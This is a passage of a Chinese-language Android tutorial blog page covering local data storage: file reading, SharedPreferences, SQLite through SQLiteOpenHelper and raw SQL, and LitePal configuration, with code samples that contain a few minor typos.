</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e )&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="文件中读取数据">文件中读取数据</h4><p>Context类提供一个openFileInput()方法，用于从文件中读取数据，只有一个参数为文件名。自动从/data/data/<package name>/files/目录下读取文件内容，返回一个对象FileInputStream</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">load</span>()&#123;</span><br><span class="line">        FileInputStream in=<span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">BufferedReader</span> writer=<span class="literal">null</span>;</span><br><span class="line">        StringBuilder content=<span class="keyword">new </span><span class="class title_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            in=<span class="title function_">openFileInput</span>(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">            reader=<span class="keyword">new </span><span class="class title_">BufferedReader</span>(<span class="keyword">new </span><span class="class title_">InputStreamReader</span>(in));</span><br><span class="line">            <span class="built_in">String</span> <span class="built_in">line</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((<span class="built_in">line</span>=reader.<span class="property">readLine</span>())! = <span class="literal">null</span>)&#123;</span><br><span class="line">            content.<span class="property">append</span>(<span class="built_in">line</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="title function_">catch</span> (IOException e) &#123;</span><br><span class="line">            e.<span class="property">printStackTrace</span>();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;                                          </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(reader!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    reader.<span class="property">close</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="title function_">catch</span>(IOException e )&#123;</span><br><span class="line">                e.<span class="property">printStackTrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> content.<span class="property">toString</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="SharedPreferences存储">SharedPreferences存储</h3><h4 id="获取SharedPreferences对象">获取SharedPreferences对象</h4><ul><li><p>Context 类中的getSharedPreferences() 方法</p><ul><li>第一个参数用于指定SharedPreferences文件的名称，如果指定的文件不存在则会创建一个，SharedPreferences文件都是存放在/data/data/<package name>/shared_prefs/目录下</li><li>第二个参数用于指定操作模式，目前只有MODE_PRIVATE这一种模式可选，它是默认的操作模式，和直接传入0效果是相同的，表示只有当前的应用程序才可以对这个SharedPreferences文件进行读写。其他几种操作模式均已被废弃</li></ul></li><li><p>Activity 类中的getPreferences() 方法</p><ul><li>它只接收一个操作模式参数。会自动将当前活动的类名作为SharedPreferences的文件名。</li></ul></li><li><p>PreferenceManager 类中的getDefaultSharedPreferences() 方法</p><ul><li>这是一个静态方法，它接收一个Context 参数，并自动使用当前应用程序的包名作为前缀来命名SharedPreferences文件</li></ul></li></ul><h4 id="存储数据">存储数据</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SharedPreferences.<span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE).edit();</span><br><span class="line">editor.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">editor.putInt(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line">editor.putBoolean(<span class="string">&quot;married&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">editor.apply();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="读取数据">读取数据</h4><p>get方法两个参数：</p><p>第一个参数是键值，</p><p>第二个默认值，即表示当传入的键找不到对应数据时以什么值返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SharedPreferences</span> <span class="variable">pref</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE); </span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> pref.getInt(<span class="string">&quot;age&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">married</span> <span class="operator">=</span> pref.getBoolean(<span class="string">&quot;married&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="SQLite数据库存储">SQLite数据库存储</h3><h4 id="创建数据库">创建数据库</h4><p>提供了一个SQLiteOpenHelper帮助类，借助这个类就可以非常简单地对数据库进行创建和升级。SQLiteOpenHelper是一个抽象类</p><p>SQLiteOpenHelper中有两个抽象方法，分别是onCreate() 和onUpgrade() ，我们必须在自己的帮助类里面重写这两个方法，然后分别在这两个方法中去实现创建、升级数据库的逻辑。<br>SQLiteOpenHelper中还有两个非常重要的实例方法：getReadableDatabase() 和getWritableDatabase() 。这两个方法都可以创建或打开一个现有的数据库（如果数据库已存在则直接打开，否则创建一个新的数据库），并返回一个可对数据库进行读写操作的对象。</p><p>不同的是，当数据库不可写入的时候getReadableDatabase() 方法返回的对象将以只读的方式去打开数据库，而getWritableDatabase() 方法则将出现异常。</p><p><strong>SQLiteOpenHelper构造方法</strong></p><ul><li><p>较少参数构造方法接收4个参数</p><ul><li>第一个参数是Context</li><li>第二个参数是数据库名，创建数据库时使用的就是这里指定的名称。</li><li>第三个参数允许我们在查询数据的时候返回一个自定义的Cursor，一般都是传入null 。</li><li>第四个参数表示当前数据库的版本号，可用于对数据库进行升级操作。</li><li>构建出SQLiteOpenHelper的实例之后，再调用它的getReadableDatabase() 或getWritableDatabase() 方法就能够创建数据库了，数据库文件会存放在/data/data/ <package name>/databases/目录下。</li><li>此时，重写的onCreate() 方法也会得到执行，所以通常会在这里去处理一些创建表的逻辑。</li></ul></li></ul><p><strong>Book表的建表语句</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Book(</span><br><span class="line">id <span class="type">integer</span> <span class="keyword">primary key</span> autoincrement,</span><br><span class="line">author <span class="type">text</span>,</span><br><span class="line">price <span class="type">real</span>,</span><br><span class="line">pages <span class="type">integer</span>,</span><br><span class="line"><span class="type">name</span> <span class="type">text</span>)</span><br></pre></td></tr></table></figure><p>SQLite不像其他的数据库拥有众多繁杂的数据类型，它的数据类型很简单，integer 表示整型，real 表示浮点型，text 表示文本类型，blob 表示二进制类</p><p>primary key：设置主键</p><p>autoincrement：表示列是自增长的</p><p><strong>创库建表：新建一个类继承SQLiteOpenHelper</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CREATE_BOOK</span> <span class="operator">=</span> <span class="string">&quot;create table Book (&quot;</span></span><br><span class="line">            + <span class="string">&quot;id integer primary key autoincrement, &quot;</span></span><br><span class="line">            + <span class="string">&quot;author text, &quot;</span></span><br><span class="line">            + <span class="string">&quot;price real, &quot;</span></span><br><span class="line">            + <span class="string">&quot;pages integer, &quot;</span></span><br><span class="line">            + <span class="string">&quot;name text)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span><br><span class="line"><span class="params">                            SQLiteDatabase.CursorFactory factory, <span class="type">int</span> version)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">&quot;Create succeeded&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>创库建表：MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dbHelper = <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>, <span class="string">&quot;BookStore.db&quot;</span>, <span class="literal">null</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>数据库中添加一个表</strong></p><p>方法一：可以删除程序，然后在相应位置添加<code>db.execSQL(CREATE_XXX);</code>再次调用getWritableDatabase()创建库，调用onCreate方法。</p><p>方法二：</p><p>修改onUpgrade方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>);</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Category&quot;</span>);</span><br><span class="line">        onCreate(db);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后在MainActivity中修改数据库等级就会调用Upgrade方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        dbHelper = <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>, <span class="string">&quot;BookStore.db&quot;</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加数据"><strong>添加数据</strong></h4><p>insert方法，三个参数</p><ul><li>参数一：表名</li><li>参数二：未指定添加数据的情况下给某些可为空的列自动赋值null，一般不用这个功能，直接传入null</li><li>ContentValues对象：提供了put方法，用于添加数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">                <span class="comment">// 开始组装第一条数据</span></span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">454</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">16.96</span>);</span><br><span class="line">                db.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values); <span class="comment">// 插入第一条数据</span></span><br><span class="line">                values.clear();</span><br><span class="line">                <span class="comment">// 开始组装第二条数据</span></span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">510</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">19.95</span>);</span><br><span class="line">                db.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values); <span class="comment">// 插入第二条数据</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="更新数据">更新数据</h4><p>update方法，四个参数</p><ul><li>参数一：表名</li><li>参数二：ContentValues对象，添加更新数据</li><li>三，四个参数：用于约束更新某一行或某几行中的数据，不指定的话默认更新所有行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">10.99</span>);</span><br><span class="line">                db.update(<span class="string">&quot;Book&quot;</span>, values, <span class="string">&quot;name = ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="删除数据">删除数据</h4><p>delete方法，三个参数</p><ul><li>参数一：表名</li><li>参数二，三：用于约束删除某一行或某几行中的数据，不指定的话默认删除所有行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                db.delete(<span class="string">&quot;Book&quot;</span>, <span class="string">&quot;pages &gt; ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="查询数据">查询数据</h4><p>query：七个参数，返回一个Cursor对象，数据在对象中</p><ul><li>参数一：表名</li><li>参数二：指定查询哪几列，不指定则默认所有列</li><li>第三 四个参数：约束查询某一行或某几行的数据，不知道默认所有行</li><li>参数五：指定需要去group by的列，不指定则不对查询结果group by</li><li>参数六：对group by后的数据进一步过滤</li><li>参数七：指定查询结果的排列方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="comment">// 查询Book表中所有的数据</span></span><br><span class="line">                <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.query(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="comment">// 遍历Cursor对象，取出数据并打印</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">                        <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>));</span><br><span class="line">                        <span class="type">int</span> <span class="variable">pages</span> <span class="operator">=</span> cursor.getInt(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>));</span><br><span class="line">                        <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cursor.getDouble(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>));</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + name);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + author);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + pages);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + price);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">                &#125;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="使用SQL操作数据库">使用SQL操作数据库</h4><ul><li><p>添加数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.execSQL(&quot;<span class="keyword">insert</span> <span class="keyword">into</span> Book (name, author, pages, price) <span class="keyword">values</span>(?, ?, ?, ?)<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            new String[] &#123; &quot;</span>The Da Vinci Code<span class="string">&quot;, &quot;</span>Dan Brown<span class="string">&quot;, &quot;</span><span class="number">454</span><span class="string">&quot;, &quot;</span><span class="number">16.96</span><span class="string">&quot; &#125;);</span></span><br><span class="line"><span class="string">db.execSQL(&quot;</span><span class="keyword">insert</span> <span class="keyword">into</span> Book (name, author, pages, price) <span class="keyword">values</span>(?, ?, ?, ?)<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            new String[] &#123; &quot;</span>The Lost Symbol<span class="string">&quot;, &quot;</span>Dan Brown<span class="string">&quot;, &quot;</span><span class="number">510</span><span class="string">&quot;, &quot;</span><span class="number">19.95</span><span class="string">&quot; &#125;);</span></span><br></pre></td></tr></table></figure></li><li><p>更新数据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="built_in">execSQL</span>(<span class="string">&quot;update Book set price = ? where name = ?&quot;</span>, <span class="keyword">new</span> <span class="type">String</span>[] &#123; <span class="string">&quot;10.99&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>删除数据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="built_in">execSQL</span>(<span class="string">&quot;delete from Book where pages &gt; ?&quot;</span>, <span class="keyword">new</span> <span class="type">String</span>[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>查询数据</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.rawQuery<span class="punctuation">(</span><span class="string">&quot;select * from Book&quot;</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="LitePal操作数据库">LitePal操作数据库</h3><h4 id="配置LitePal">配置LitePal</h4><ol><li><strong>添加LitePal依赖</strong></li></ol><p>编辑<code>app/build.gradle</code>文件，在dependencies闭包中添加如下内容</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="keyword">compile</span> <span class="keyword">fileTree</span>(dir: <span class="string">&#x27;libs&#x27;</span>, <span class="keyword">include</span>: [<span class="string">&#x27;*.jar&#x27;</span>])</span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;com.android.support:appcompat-v7:23.2.0&#x27;</span></span><br><span class="line">    testCompile <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;org.litepal.android:core:1.4.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.配置litepal.xml文件</strong></p><p>右击<code>app/src/main</code>目录→<code>New</code>→<code>Directory</code>，创建一个<code>assets</code>目录，然后在assets目录下再新建一个litepal.xml文件，接着编辑litepal.xml文件中的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;BookStore&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;dbname&gt;</code>标签用于指定数据库名</li><li><code>&lt;version&gt;</code> 标签用于指定数据库版本号</li><li><code>&lt;list&gt;</code>标签用于指定所有的映射模型</li></ul><p><strong>3.配置LitePalApplication</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.litepaltest&quot;</span>&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:name=<span class="string">&quot;org.litepal.LitePalApplication&quot;</span></span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;<span class="variable">@mipmap</span>/ic_launcher&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;<span class="variable">@string</span>/app_name&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:theme=<span class="string">&quot;<span class="variable">@style</span>/AppTheme&quot;</span>&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;<span class="regexp">/application&gt;</span></span><br><span class="line"><span 